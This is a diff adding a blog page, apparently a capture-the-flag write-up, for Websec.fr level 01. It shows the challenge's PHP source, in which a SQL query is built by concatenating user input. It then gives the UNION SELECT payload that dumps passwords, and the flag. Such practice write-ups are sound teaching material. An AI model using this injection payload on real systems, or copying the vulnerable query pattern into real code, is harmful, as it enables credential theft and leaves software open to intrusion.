@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>Websec.fr Level 01 &ndash; Tedsig42</title>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/palettes/tokyo-night-dark.css">
+<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta property="og:title" content="Websec.fr Level 01 &ndash; Tedsig42" />
+<meta property="og:url" content="http://localhost:1313/posts/websec-fr-level1/" />
+
+  
+
+<meta property="og:locale" content="en-us" />
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+      <li class="nomarker"><h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">Tedsig42</a></h1></li>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/about/" title="">About</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/posts/" title="">Posts</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/friends/" title="">Friends</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/musics/" title="">Music</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/art/" title="">Art</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/blogs/" title="">Blogs</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/book-review/" title="">Book Reviews</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>Websec.fr Level 01</h1>
+    </header>
+    <div class="content__body">
+        <p>A Websec.fr level 1
+<code>level01</code> - <strong>1 point- 2564 solves</strong>
+<img src="/images/stc/websec-level1.png" alt="alt"></p>
+<p>We have a source code of <a href="http://websec.fr/level01/source.php">level1</a>, i show only a php code because the
+vulnerability is only in php code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span> ();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#e6db74">&#39;on&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;error_reporting&#39;</span>, <span style="color:#66d9ef">E_ALL</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;anti_csrf.php&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">init_token</span> ();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LevelOne</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">doQuery</span>($injection) {
+</span></span><span style="display:flex;"><span>        $pdo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SQLite3</span>(<span style="color:#e6db74">&#39;database.db&#39;</span>, <span style="color:#a6e22e">SQLITE3_OPEN_READONLY</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;SELECT id,username FROM users WHERE id=&#39;</span> <span style="color:#f92672">.</span> $injection <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39; LIMIT 1&#39;</span>;
+</span></span><span style="display:flex;"><span>        $getUsers <span style="color:#f92672">=</span> $pdo<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($query);
+</span></span><span style="display:flex;"><span>        $users <span style="color:#f92672">=</span> $getUsers<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetchArray</span>(<span style="color:#a6e22e">SQLITE3_ASSOC</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($users) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> $users;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span> ($_POST[<span style="color:#e6db74">&#39;submit&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span> ($_POST[<span style="color:#e6db74">&#39;user_id&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">check_and_refresh_token</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $lo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LevelOne</span> ();
+</span></span><span style="display:flex;"><span>    $userDetails <span style="color:#f92672">=</span> $lo<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">doQuery</span> ($_POST[<span style="color:#e6db74">&#39;user_id&#39;</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">........
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></span></span></code></pre></div><p>The <strong>problem</strong> here is this line <code>$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';</code> it&rsquo;s a <strong>sqli</strong> .</p>
+<p><img src="/images/stc/levelone.png" alt="alt text"></p>
+<p>So for any number between <code>1</code> and <code>3</code> we have a <code>username</code>, and our mission is to display a <code>password</code> who can be a flag.</p>
+<p>For 1 :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>id -&gt; 1
+</span></span><span style="display:flex;"><span>username -&gt; levelone
+</span></span></code></pre></div><p>For 2 :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>id -&gt; 2
+</span></span><span style="display:flex;"><span>username -&gt; jvoisin
+</span></span></code></pre></div><p>For 3 :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>id -&gt; 3
+</span></span><span style="display:flex;"><span>username -&gt; ExampleUser
+</span></span></code></pre></div><p>The payload is : <code>1 UNION SELECT id, password FROM users</code></p>
+<p><img src="/images/stc/flag-levelone.png" alt="alt text"></p>
+<p>Flag : <code>WEBSEC{Simple_SQLite_Injection}</code></p>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+
+<ul class="aside__social-links">
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+    
+        <p>
+            
+            2025-12-10
+        </p>
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      
+          
+            
+            
+                <br/><span class="active">$ echo $LANG<br/><b></b></span><br/>
+
+            
+          
+      
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
